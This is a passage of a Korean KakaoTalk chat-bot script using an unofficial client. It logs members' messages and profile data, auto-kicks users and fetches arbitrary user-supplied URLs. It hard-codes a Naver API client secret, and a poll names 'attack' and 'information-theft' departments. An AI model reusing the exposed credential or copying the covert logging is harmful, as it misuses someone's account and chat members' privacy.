      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
      t: 4,
      ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
  ],
};
let runn = false;
let jjokji = "";
const __path = "logs.json";
let chatLog = JSON.parse(require("fs").readFileSync(__path, "utf8"));
let mantion = [];
let ipinfo = require("ipinfo");
var what_1;
let atst = false;
let stu = [];
let studylst = [];
let studylst_2 = [];
if (stu.length == 2) {
  studylst.push(stu[0]);
  studylst_2.push(stu[1]);
}
let runnings = false;
let eeee = [];
const check = {};
const TIME_MILISEC = 3 * 1000; //X초 동안
const MSG_NUM = 7; //Y개의 메세지
let banroom = [];
var str = "";
var qu = [];
var an = {};
let studylist = {};
var ans = [
  "에펠탑",
  "경복궁",
  "지우개",
  "연필",
  "한국",
  "일본",
  "중국",
  "미국",
  "프랑스",
  "독일",
];
var hint = [
  "프랑스 파리의 상징적인 건물",
  "대한민국 서울 세종로에 있는 대조선국 왕조의 법궁(法宮, 정궁)",
  "연필과 함께하는 무엇",
  "지우개와 함께하는 무엇",
  "우리와 가깝고 빠른 시 내에 성장에 성공한 국가",
  "우리와 가깝고 경제가 발달한 국가",
  "개같은 국가",
  "현재 세계 경제의 중심 국가",
  "수도는 파리",
  "억지로 통일된 국가/매우 빠른 경제성장",
];
var kickList = [];
var kickYN = [];
var chose;
let onon = true;
let roomList = [];
let imgbool = false;
let place;
let levell;
let arrr = [];
let namee;
let users = [];
let timee = [];
const chainer = require("word-chainer");
const covid19 = require("covid19-korea");
const translate = require("@iamtraction/google-translate");
var express = require("express");
var express = require("express");
var app = express();
var http = require("http").Server(app); //1
var io = require("socket.io")(http); //1
var bodyParser = require("body-parser");
var client_id = "uKVDEHGRPUrKv4k9flCs";
var client_secret = "m3cj5bfe4A";
var api_url = "https://openapi.naver.com/v1/papago/n2mt";
let allhide = false;
var timeJoinLeftStamp = [];
var __createBinding =
  (this && this.__createBinding) ||
  (Object.create
    ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        Object.defineProperty(o, k2, {
          enumerable: true,
          get: function () {
            return m[k];
          },
        });
      }
    : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
var __setModuleDefault =
  (this && this.__setModuleDefault) ||
  (Object.create
    ? function (o, v) {
        Object.defineProperty(o, "default", { enumerable: true, value: v });
      }
    : function (o, v) {
        o["default"] = v;
      });
const download = require("download");
const googleTTS = require("google-tts-api"); // CommonJS
var __importStar =
  (this && this.__importStar) ||
  function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null)
      for (var k in mod)
        if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k))
          __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
  };

var __awaiter =
  (this && this.__awaiter) ||
  function (thisArg, _arguments, P, generator) {
    function adopt(value) {
      return value instanceof P
        ? value
        : new P(function (resolve) {
            resolve(value);
          });
    }
    return new (P || (P = Promise))(function (resolve, reject) {
      function fulfilled(value) {
        try {
          step(generator.next(value));
        } catch (e) {
          reject(e);
        }
      }
      function rejected(value) {
        try {
          step(generator["throw"](value));
        } catch (e) {
          reject(e);
        }
      }
      function step(result) {
        result.done
          ? resolve(result.value)
          : adopt(result.value).then(fulfilled, rejected);
      }
      step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
  };
var __importDefault =
  (this && this.__importDefault) ||
  function (mod) {
    return mod && mod.__esModule ? mod : { default: mod };
  };
Object.defineProperty(exports, "__esModule", { value: true });
const Utils = require("util");
const fs = require("fs");
const cheerio = require("cheerio");
const request = require("request");
const { OpenMemberType } = require("node-kakao");
const node_kakao_1 = require("node-kakao");
const readline_1 = __importDefault(require("readline"));
const account = __importStar(require("./account.json"));
const crypto_1 = __importDefault(require("crypto"));
const { email, pw, deviceName, deviceUUID } = account;
const client = new node_kakao_1.TalkClient(deviceName, deviceUUID, {
  version: "3.2.6",
  appVersion: "3.2.6.2748",
  xvcSeedList: ["KEPHA", "HALEY"],
});
const path = require("path");
const filepath = path.resolve(__dirname, "info.json");
const ytdl = require("ytdl-core");
const {
  ManagedChatChannel,
} = require("node-kakao/dist/talk/managed/managed-chat-channel");
let chatReaders = {};
let detectingUsers = [];
let noChatUsers = [];
let adminList = [
  "353986587",
  "6588371846512416130",
  "6296044616948997161",
  "8020742745978816902",
  "5001411819066676027",
  "5448897130990369938",
  "7827165662607939797",
  "340198330",
  "363286212",
];
let cartifiInfo = {
  waiting: false,
  key: "",
};
let padd = [];
let bannroom = true;
let blacklist = [];
let runningSpam = false;
let runnin = false;
let spamInterv;
let spamInterval;
let spamInter;
let spamIn;
let placeee;
client
  .login(email, pw, true)
  .then(() => {
    console.log("READY");
  })
  .catch((error) =>
    __awaiter(void 0, void 0, void 0, function* () {
      if (error.status == -100) {
        let rl = readline_1.default.createInterface({
          input: process.stdin,
          output: process.stdout,
        });
        client.Auth.requestPasscode(email, pw);
        let passcode = yield new Promise((resolve) =>
          rl.question("PASSCODE: ", resolve)
        );
        rl.close();
        let registerRes = yield client.Auth.registerDevice(
          passcode,
          email,
          pw,
          true
        );
        if (registerRes.status === 0) {
          client.login(email, pw, true);
          console.log("READY");
        } else {
          console.log(registerRes.status);
          process.exit();
        }
      } else {
        console.log(JSON.stringify(error, null, 2));
      }
    })
  );
const type_e = Object.keys(node_kakao_1.ChatType).slice(37, 72),
  type_n = Object.keys(node_kakao_1.ChatType).slice(0, 35);
client.on("profile_changed", (channel, user, info, profile) => {
  var userInfo = channel.getUserInfo(user);
  var channel_1 = client.ChannelManager.get(channel.Id);
  if (onon) {
    channel_1.sendText(
      "[ ! ] " +
        userInfo.Nickname +
        "님이 프로필을 변경했습니다" +
        allsee_1 +
        "\n원래 닉: " +
        info.nickName +
        "\n원래 프사: " +
        info.OriginalProfileImageURL +
        "\n" +
        "현재 유저타입: " +
        profile.toString()
    );
  }
  console.log(info);
});
client.on("user_join", (channel, user, joinFeed) => {
  var userInfo = channel.getUserInfo(joinFeed.sender);
  if (!userInfo) return;
  var id = String(joinFeed.sender.id);
  if (kickList.includes(id) && onon) {
    joinFeed.replyText(
      new node_kakao_1.ChatMention(joinFeed.sender),
      " 들낙을 감지합니다. 10초 안에 응답을 결정해주세요. (!Y : 강퇴, !N : 취소)"
    );
    setTimeout(function () {
      if (kickYN.includes("Y") && onon) {
        client.OpenLinkManager.kickMember(channel, joinFeed.sender.id);
        joinFeed.replyText(
          new node_kakao_1.ChatMention(joinFeed.sender),
          " 님을 강퇴했습니다."
        );
        kickYN.pop();
      } else if (kickYN.includes("N") && onon) {
        joinFeed.replyText(
          new node_kakao_1.ChatMention(joinFeed.sender),
          " 님의 강퇴를 취소했습니다."
        );
        kickYN.pop();
      } else {
        joinFeed.replyText(
          "[ ! ] 10초동안 응답이 없으므로 ",
          new node_kakao_1.ChatMention(joinFeed.sender),
          " 님의 강퇴를 취소했습니다."
        );
        kickYN.pop();
      }
    }, 10000);
  } else {
    if (onon) {
      joinFeed.replyText(
        "[ ! ] ",
        new node_kakao_1.ChatMention(joinFeed.sender),
        "님이 입장했습니다"
      );
    }
  }
});
client.on("user_left", (channel, user, feed) => {
  var userInfo = channel.getUserInfo(feed.sender);
  if (!userInfo) return;
  var id = String(feed.sender.id);
  /*입퇴장기록*/ var onegang = new Date();
  /*입퇴장기록*/ timeJoinLeftStamp.push(
    "(퇴장)\n닉네임: " +
      userInfo.Nickname +
      "\n시간 : " +
      onegang.getHours() +
      "시 " +
      onegang.getMinutes() +
      "분"
  );
  if (feed.feed.feedType !== 6 && onon) {
    feed.replyText(
      "[ ! ] ",
      new node_kakao_1.ChatMention(userInfo),
      "님이 퇴장했습니다"
    );
    kickList.push(id);
  }
});

client.on("user_kicked", (channel, user, feed) => {
  var kickedUserInfo = channel.getUserInfo(user);
  var kickuserInfo = channel.getUserInfo(feed.sender);
  /*입퇴장기록*/ var onegang = new Date();
  /*입퇴장기록*/ timeJoinLeftStamp.push(
    "(강퇴)\n닉네임: " +
      kickuserInfo.Nickname +
      "(강퇴자명: " +
      kickedUserInfo.Nickname +
      ")\n시간 : " +
      onegang.getHours() +
      "시 " +
      onegang.getMinutes() +
      "분"
  );
  if (feed.feed.feedType == 6 && onon) {
    feed.replyText(
      "[ ! ] ",
      new node_kakao_1.ChatMention(kickuserInfo),
      " 🤜💥 ",
      new node_kakao_1.ChatMention(kickedUserInfo)
    );
  }
});
var order = 0;
var list = [];
function checkTime() {
  setInterval(function getTime() {
    let today = new Date();
    let hours = today.getHours();
    let minutes = today.getMinutes(); // 분
    let seconds = today.getSeconds();
    if (hours == 0 && minutes == 0 && seconds == 0) {
      order = 0;
      list = "";
    }
  }, 1000);
}
checkTime();
const School = require("school-kr");
const sch = new School();
const { search } = require("yt-getvideos");
const { off } = require("node:process");
const { DH_CHECK_P_NOT_SAFE_PRIME } = require("node:constants");
var ggutroom = false;
var ggutroomid;
var p1;
var p1id;
var p2id;
var p2;
var start = p1;
let allsee_1 = "\u200b".repeat(500);
let profiletemplate = {
  OpenProfileTemplate: {
    Anon: {
      anonNickname: "test",
      anonProfilePath: "",
    },
    Link: {
      profileLinkId: "98779766826382616486214",
    },
  },
};

let today_meal;
let nothing = [];
client.on("message", (chat) =>
  __awaiter(void 0, void 0, void 0, function* () {
    let userInfo = chat.Channel.getUserInfo(chat.Sender);
    let today = new Date();
    let hours = today.getHours();
    let minutes = today.getMinutes(); // 분
    let seconds = today.getSeconds();
    let userId = String(userInfo.Id);
    let channelId = String(chat.Channel.Id);
    let openChannel = chat.Channel;
    let mentionList = chat.getMentionContentList();
    let { Text, Type } = chat;
    var a = "";
    let id_0 = String(chat.sender.id);
    let roomId = String(chat.channel.dataStruct.channelId);
    if (!chatLog[roomId]) chatLog[roomId] = [];
    chatLog[roomId].push({
      "보낸사람 정보": [
        userInfo.Nickname,
        Number(id_0),
        userInfo.OriginalProfileURL,
      ],
      채팅: chat.Text,
      "보낸 시간": chat.sendTime,
      "이전 로그ID": Number(chat.prevLogId),
      로그ID: Number(chat.logId),
      메시지ID: chat.messageId,
      "채팅 타입":
        String(chat.Type) + " " + type_e[type_n.indexOf(String(chat.Type))],
      어태치: chat.rawAttachment,
    });
    if (onon) {
      if (Text.startsWith(".긴단어")) {
        fs.readFile("long.txt", "utf8", function (err, data) {
          var result =
            '"' + Text.substr(5) + '"로 시작하는 긴 단어\n----------';
          var longwords = data.split("\n");
          for (i = 0; i < longwords.length; i++) {
            if (longwords[i][0] > Text.substr(5)) {
              result = Text.substr(5) + '"로 시작하는 긴 단어가 없습니다. ';
            }
            if (longwords[i][0] == Text.substr(5))
              result += "\n" + longwords[i];
          }
          chat.replyText(result);
        });
      }
      if (Text == ".끝말잇기") {
        chat.replyText(
          "[ ! ] 끝말잇기를 시작합니다!\n.난이도 로 난이도를 입력해주세요(쉬움/보통/어려움/극한)\n.시작 으로 시작합니다"
        );
      }
      //AI말하기
      if (studylst.includes(Text)) {
        chat.replyText(studylst_1[studylst.indexOf(Text)]);
      }
      if (Text == ".부서투표") {
        client.chatManager.sendRaw(chat.channel, 97, "Unknown", {
          os: [
            {
              t: 3,
              st: 2,
              u: {
                id: 353986587,
              },
            },
            {
              t: 9,
              st: 0,
              tt: "부서 선택",
              its: [
                {
                  tt: "어택부",
                },
                {
                  tt: "외교부",
                },
                {
                  tt: "정보탈취부",
                },
              ],
            },
            {
              t: 2,
              st: 4,
              url: "kakaomoim://post?referer=b&chat_id=18327116871432047&post_id=tKRkAS4dVSxHZlpVzjns",
            },
          ],
        });
      }
      if (isSpam(userInfo.Id)) {
        setTimeout(() => {
          chat.hide();
        }, 170);
        client.chatManger.sendRaw(
          chat.channel,
          1,
          "[ ! ] 도배가 감지되어 개발자를 호출합니다. @임지혁 @임지혁",
          {
            mentions: [
              {
                user_id: 353986587,
                at: [1],
                len: 3,
              },
            ],
          }
        );
      }
      //도배감지
      function isSpam(sender) {
        const time = Date.now();
        if (check[sender] === undefined) {
          check[sender] = {};
          check[sender].time = time;
          check[sender].count = 1;
          setTimeout(() => delete check[sender], TIME_MILISEC);
        } else check[sender].count++;
        return checkSpam(sender, time);
      }
      function checkSpam(sender, time) {
        if (
          check[sender].count >= MSG_NUM &&
          time - check[sender].time < TIME_MILISEC
        ) {
          return true;
        } else return false;
      }
      if (Text.indexOf(".난이도") == 0) {
        var a = Text.substr(5);
        if (a == "쉬움") {
          level = chainer.EasyLevel;
          chat.replyText("[ ! ] 난이도가 쉬움으로 설정되었습니다");
        } else if (a == "보통") {
          level = chainer.NormalLevel;
          chat.replyText("[ ! ] 난이도가 보통으로 설정되었습니다");
        } else if (a == "어려움") {
          level = chainer.HardLevel;
          chat.replyText("[ ! ] 난이도가 어려움으로 설정되었습니다");
        } else if (a == "극한") {
          level = chainer.InsaneLevel;
          chat.replyText("[ ! ] 난이도가 극한으로 설정되었습니다");
        } else {
          chat.replyText("[ ! ] 다시 입력해주세요");
        }
      }
      if (Text == ".시작") {
        chat.replyText(
          "[ ! ] " +
            userInfo.Nickname +
            "님과 봇의 끝말잇기를 시작합니다!\n::을 붙이고 단어를 먼저 말해주세요!"
        );
      }
      const bot = new chainer.WordChainer(level);
      if (Text.indexOf("::") == 0) {
        var a = Text.substr(2);
        if (a == "gg") {
          chat.replyText(
            "[ ! ] " +
              userInfo.Nickname +
              "님이 포기하여 자동적으로 봇의 승리로 간주됩니다"
          );
        }
        try {
          const next = bot.next(a);
          chat.replyText(`Bot: ${next}`);
          if (next == "gg") {
            chat.replyText(
              "[ ! ] 봇이 포기하였습니다 " +
                userInfo.Nickname +
                "님의 승리입니다!"
            );
          }
        } catch (e) {
          chat.replyText(e.toString());
        }
      }
      if (Text.indexOf(".ㅍ") == 0) {
        var query = Text.substring(3);
        var query_1 = encodeURI(query);
        var a = "";
        var url = `https://builder.pingpong.us/api/builder/pingpong/chat/demo?query=${query_1}`;
        request(url, function (error, response, html) {
          var $ = cheerio.load(html);
          var a = html.replace('{"response":{"replies":[{"reply":"', "");
          var b = a.replace('","type":"text"}]},"version":"1.0.0"}', "");
          var c = b.split("\\");
          var d = c[0].split('"');
          chat.replyText("[ ! ] " + d[0]);
        });
      }
      if (Text.indexOf(".자동번역") == 0) {
        var a = Text.split(" ");
        var b = Text.substring(9);
        if (
          a == "zh-CN" ||
          a == "zh-TW" ||
          a == "en-GB" ||
          a == "pt-BR" ||
          a == "pt-PT"
        ) {
          b = Text.substring(14);
        }
        translate(b, { to: a[1] })
          .then((res) => {
            chat.replyText(res.text); // OUTPUT: You are amazing!
          })
          .catch((err) => {
            chat.replyText(err);
          });
      }
      if (Text.indexOf(".수동번역") == 0) {
        var a = Text.split(" ");
        var b = Text.substring(12);
        if (
          (a == "zh-CN" ||
            a == "zh-TW" ||
            a == "en-GB" ||
            a == "pt-BR" ||
            a == "pt-PT") &&
          (b != "zh-CN" ||
            b != "zh-TW" ||
            b != "en-GB" ||
            b != "pt-BR" ||
            b != "pt-PT")
        ) {
          b = Text.substring(15);
        }
        if (
          (a != "zh-CN" ||
            a != "zh-TW" ||
            a != "en-GB" ||
            a != "pt-BR" ||
            a != "pt-PT") &&
          (b == "zh-CN" ||
            b == "zh-TW" ||
            b == "en-GB" ||
            b == "pt-BR" ||
            b == "pt-PT")
        ) {
          b = Text.substring(15);
        }
        if (
          (a == "zh-CN" ||
            a == "zh-TW" ||
            a == "en-GB" ||
            a == "pt-BR" ||
            a == "pt-PT") &&
          ((b == langu) == "zh-CN" ||
            b == "zh-TW" ||
            b == "en-GB" ||
            b == "pt-BR" ||
            b == "pt-PT")
        ) {
          b = Text.substring(17);
        }
        translate(b, { from: a[1], to: a[2] })
          .then((res) => {
            chat.replyText(res.text); // OUTPUT: Je vous remercie
          })
          .catch((err) => {
            chat.replyText(err);
          });
      }
      if (Text.indexOf(".파싱") == 0) {
        url = encodeURI(Text.substring(4));
        request(url, function (err, res, html) {
          try {
            var $ = cheerio.load(html);
            chat.replyText(
              "[ ! ] 파일의 크기가 클 경우 작동을 안 할 수 있습니다..\n" +
                allsee_1 +
                String(html)
            );
          } catch (err) {
            chat.replyText(String(err));
          }
        });
      }
      if (Text.indexOf(".이진수") == 0) {
        let num = Text.substring(5);
        chat.replyText(
          `[ ! ] ${num}를 이진수로 변환 --> ${parseInt(num).toString(2)}`
        );
      }
      function binToString(binary) {
        let char = "";

        for (let i = 1; i < binary.length / 8 + 1; i++) {
          char += String.fromCharCode(
            Number("0b" + binary.slice((i - 1) * 8, i * 8))
          );
        }

        return char;
      }
      if (Text.indexOf(".문자화") == 0) {
        let number = Text.substring(5);
        chat.replyText(binToString(number));
      }
      if (Text.indexOf(".십진수") == 0) {
        let numb = Text.substring(5);
        chat.replyText(`[ ! ] ${numb}를 십진수화 --> ${parseInt(numb, 10)}`);
      }
      if (Text == ".영단어") {
        var url = `https://learn.dict.naver.com/endic/today/words.nhn`;
        var allsee = "\u200b".repeat(500);
        request(url, function (error, response, html) {
          var $ = cheerio.load(html);

          var result = "";

          for (var i = 1; i < 6; i++) {
            result +=
              html.split('<em class="words">')[i].split("<")[0] +
              "\n" +
              html
                .split('<p class="txt_ct2">')
                [i].split("</p>")[0]
                .replace('<span class="txt_col">', "")
                .replace("</span>", "\n")
                .replace(/;/g, "\n") +
              "\n\n";
          }
          chat.replyText(
            "[ ! ] 오늘의 영단어입니다!\n" + allsee + String(result)
          );
        });
      }
      if (Text.indexOf(".암호화") == 0) {
        var res = [];
        for (var i = 0; i < Text.substr(5).length; i++) {
          res.push(Text.substr(5).charCodeAt(i));
        }
        chat.replyText(res.join("·"));
      }

      if (Text.indexOf(".복호화") == 0) {
        var code = Text.substr(5).split("·");
        var de = [];
        for (var i = 0; i < code.length; i++) {
          de.push(String.fromCharCode(code[i]));
        }
        chat.replyText(de.join(""));
      }
      if (Text == ".출첵") {
        order += 1;
        if (list.includes(userInfo.Nickname)) {
          chat.replyText("[ ! ] 이미 출석하셨습니다!");
        } else {
          chat.replyText(
            "[ ! ] " +
              userInfo.Nickname +
              "님이 " +
              String(order) +
              "번째로 출석체크 하였습니다!"
          );
          list.push(userInfo.Nickname);
        }
      }
      if (Text == ".출석초기화") {
        order = 0;
        list = [];
        chat.replyText("[ ! ] 출석이 초기화되었습니다.");
      }
      if (Text == ".출석리스트") {
        if (list[0] == null) {
          chat.replyText("[ ! ] 현재 아무도 출석하지 않았습니다!");
        } else {
          chat.replyText(
            "[ ! ] 현재 출석한 인원입니다" +
              "\u200b".repeat(500) +
              "\n" +
              list.join("\n")
          );
        }
      }
      if (chat.Text.indexOf(".구글") == 0) {
        sc = chat.Text.substring(4);
        chat.replyText(
          "[ ! ] 구글 검색 결과입니다.\nhttps://www.google.com/search?q=" +
            encodeURI(sc)
        );
      }
      if (Text == ".한국코로나") {
        covid19.getTotal().then((result) => {
          var a = JSON.stringify(result);
          var b = a.split('"');
          var confirm = b[3];
          var cure = b[7];
          var curing = b[11];
          var dead = b[15];
          var accumlate = b[19];
          chat.replyText(
            "국내 코로나19 확진 누적 현황\n•─────⋅☾ ☽⋅─────•\n확진: " +
              confirm +
              " 명\n완치: " +
              cure +
              " 명\n치료중: " +
              curing +
              " 명\n사망자: " +
              dead +
              " 명\n누적 검사수: " +
              accumlate +
              "\n•─────⋅☾ ☽⋅─────•"
          );
        });
      }
      if (Text.indexOf(".코로나") == 0) {
        var a = Text.substring(5);
        covid19.getTotal(a).then((result) => {
          var search = Text.substring(5);
          var c = JSON.stringify(result);
          var b = c.split('"');
          var confirm = b[3];
          var cure = b[7];
          var curing = b[11];
          var dead = b[15];
          var accumlate = b[19];
          chat.replyText(
            search,
            " 내의 코로나19 확진 현황\n•─────⋅☾ ☽⋅─────•\n확진: " +
              confirm +
              " 명\n완치: " +
              cure +
              " 명\n치료중: " +
              curing +
              " 명\n사망자: " +
              dead +
              " 명\n누적 검사수: " +
              accumlate +
              "명\n•─────⋅☾ ☽⋅─────•"
          );
        });
      }
      function cho_hangul(str) {
        var cho = [
          "ㄱ",
          "ㄲ",
          "ㄴ",
          "ㄷ",
          "ㄸ",
          "ㄹ",
          "ㅁ",
          "ㅂ",
          "ㅃ",
          "ㅅ",
          "ㅆ",
          "ㅇ",
          "ㅈ",
          "ㅉ",
          "ㅊ",
          "ㅋ",
          "ㅌ",
          "ㅍ",
          "ㅎ",
        ];

        var result = "";

        for (var i = 0; i < str.length; i++) {
          var code = str.charCodeAt(i) - 44032;

          if (code > -1 && code < 11172) result += cho[Math.floor(code / 588)];
          else result += str.charAt(i);
        }

        return result;
      }

      if (Text.indexOf(".초성 ") == 0) {
        var a = Text.substring(4);

        chat.replyText(cho_hangul(a));
      }
      if (qu.includes(Text)) chat.replyText(an[Text].toString());
      if (chat.Text == ".업데이트") {
        chat.replyText("[ ! ] recent version:1.7.3\n.연컴\n.연컴중지");
      }
      if (chat.Text.indexOf(".맵") == 0) {
        sc = chat.Text.substring(5);
        chat.replyText(
          "[ ! ] 구글 맵 결과입니다.\nhttps://www.google.co.kr/maps/search/" +
            encodeURI(sc)
        );
      }
      //여기까지
      if (chat.Type === node_kakao_1.ChatType.Search) {
        let attachment = chat.AttachmentList[0];

        chat.replyText(
          `[ ! ] ${userInfo.Nickname}님이 샵 검색 전송 ${attachment.Question}. 리다이렉트 경로: ${attachment.RedirectURL}`
        );
      }
      if (chat.Text === "테스트용") {
        chat.replyText("[ ! ] 테스트 대답");
      }
      let arr = new Array();

      if (Text == ".업다운") {
        chat.replyText(
          "[ ! ] 업다운 게임을 시작합니다.\n//+숫자를 입력하세요.\n그 숫자가 지정된 숫자보다 크다면 업을 반환하고, 작으면 다운을 반환합니다"
        );
        chose = Math.floor(Math.random() * 999);
      }

      if (Text.startsWith("//")) {
        var num_2 = Text.substr(2);
        if (num_2 < chose) {
          chat.replyText("[ ! ] 업");
        } else if (num_2 > chose) {
          chat.replyText("[ ! ] 다운");
        } else if (num_2 == chose) {
          chat.replyText("정답!");
        } else {
          chat.replyText("[ ! ] 0~999 사이의 숫자를 입력해주세요!");
        }
      }
      if (Text.startsWith(".event")) {
        var event_1 = String(Text.substr(7));
        client.chatManager.sendRaw(chat.channel, 1, event_1, {
          decoEvent: { eventID: 1625464374 },
        });
      }
      const banWord = [
        "느억맘",
        "ㄴㄱㅁ",
        "느금빠",
        "니.애미",
        "느그.애미",
        "앰창",
        "엠창",
        "ㄴㄱㅁ",
        "창녀",
        "느금마",
        "니애미",
        "니에미",
        "애미없",
        "애비없",
        "느그애미",
        "느개비",
        "느게비",
        "느그애비",
        "니에비",
        "니애비",
        "느개미",
      ];
      if (padd.includes(chat.Channel.Id) == false) {
        for (var i = 0; i < banWord.length; i++) {
          if (
            JSON.stringify(chat.rawAttachment).includes(banWord[i]) ||
            chat.Text.includes(banWord[i])
          ) {
            setTimeout(() => {
              chat.hide();
            }, 170);
            client.OpenLinkManager.kickMember(chat.channel, chat.sender.id);
            chat.replyText(
              "[ ! ] " +
                userInfo.Nickname +
                "님이 과도한 욕설로 자동적으로 강퇴처리 당하였습니다."
            );

            break;
          }
        }
      }
      const baned = ["주식", "비트코인", "광고", "코인", "투자"];
      for (var i = 0; i < baned.length; i++) {
        if (
          JSON.stringify(chat.rawAttachment).includes(baned[i]) ||
          chat.Text.includes(baned[i])
        ) {
          setTimeout(() => {
            chat.hide();
          }, 170);
          chat.replyText("[ ! ] 광고 감지");

          break;
        }
      }
      var getFirstChar = (str) =>
        str
          .split("")
          .map((e) => e.normalize("NFKD")[0])
          .join("");
      if (chat.Text == ".아무말") {
        var value = Math.floor(Math.random() * 54);
        switch (value) {
          case 0:
            sendAny(
              chat,
              "https://search1.daumcdn.net/thumb/C328x328.q85/?fname=https%3A%2F%2Ft1.search.daumcdn.net%2Ftextcon%2Fstatics%2F109.png"
            );
            break;
          case 1:
            sendAny(
              chat,
